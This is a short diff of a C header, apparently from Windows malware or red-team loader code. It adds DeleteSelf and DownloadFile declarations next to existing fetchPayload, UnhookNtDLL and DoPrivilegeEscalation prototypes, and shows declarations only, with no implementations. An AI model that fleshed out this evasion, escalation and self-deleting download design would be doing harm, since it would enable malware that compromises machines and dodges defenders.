@@ -27,3 +27,5 @@ int fetchPayload();
 FARPROC GetProcAddressQ(IN HMODULE hModule, IN LPCSTR lpApiName);
 BOOL UnhookNtDLL();
 BOOL DoPrivilegeEscalation();
+BOOL DeleteSelf();
+BOOL DownloadFile(LPCSTR url, LPCSTR localFile);
